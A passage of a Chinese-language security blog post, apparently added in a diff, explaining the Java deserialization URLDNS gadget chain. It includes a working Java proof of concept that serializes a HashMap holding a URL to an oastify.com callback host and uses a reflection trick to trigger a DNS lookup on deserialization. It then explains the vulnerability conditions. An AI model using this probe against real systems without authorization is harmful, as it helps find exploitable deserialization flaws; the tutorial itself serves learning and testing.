class="string">&quot;http://1qsmyib3y8gcskvlhgu046qxtozfn5bu.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);<span class="comment">//这里将url对象的hashCode字段设置为123防止在put操作时提前进行dns查询</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>);<span class="comment">//重新设置回-1</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/urldns.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//序列化过程</span></span><br><span class="line"></span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/urldns.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"></span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释一下为什么要先把url对象的hashCode字段先设置为123，然后再改回-1，例如直接改为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(url,<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
+
+<p>为什么在这里就会直接触发DNS请求呢，查看刚才分析过的<code>URL#hashCode</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不为<code>-1</code>，那么将直接返回，不进行<code>handler.hashCode(this);</code>这一步计算<code>hashCode</code>，也就不会有之后的<code>getByName</code>方法来触发DNS查询</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java 反序列化漏洞核心就是执行<strong>被反序列化类</strong>的 <code>readObject()</code> 方法，<code>readObject()</code> 是整个利用链的起点。纵观整个反序列化的过程，最难的是利用链的构造。</p>
+<p>一个系统存在反序列化漏洞需要满足以下条件：</p>
+<ol>
+<li>需要可接收用户数据的<code>ObjectInputStream -&gt; readObject()</code></li>
+<li>存在有效利用链的 lib&#x2F;jar 包（一般不太可能根据程序自身的反序列化类构造一个利用链，除非白盒测试）</li>
+</ol>
+<p>正常的反序列化类是没有危害的。只有当「被反序列化的类」重写了 <code>readObject()</code> 方法，且重写方法中存在「利用链」才属于不安全的。因为在「被反序列化的类」被反序列化时会自动执行 <code>readObject()</code> 方法，所以首先需要的是重写 <code>readObject()</code>，其次是重写的方法中存在「有效的利用链」。这里「利用链」有的是通过反射，有的是通过动态代理，有的是通过 JNDI 注入等等方法才导致最后的 RCE 。</p>
+<p>「被反序列化的类」一般都是 lib&#x2F;jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 <code>readObject()</code> 且存在「有效的利用链」（普通的开发都是功能型开发，很少用到反序列化，由于 Json 的普及使得极少情况下才需要手写序列化的类</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/" rel="tag"># java,java反序列化,URLDNS</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/18/W1R3S/" rel="prev" title="W1R3S">
+                  <i class="fa fa-angle-left"></i> W1R3S
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hllttz</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">383k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">5:49</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
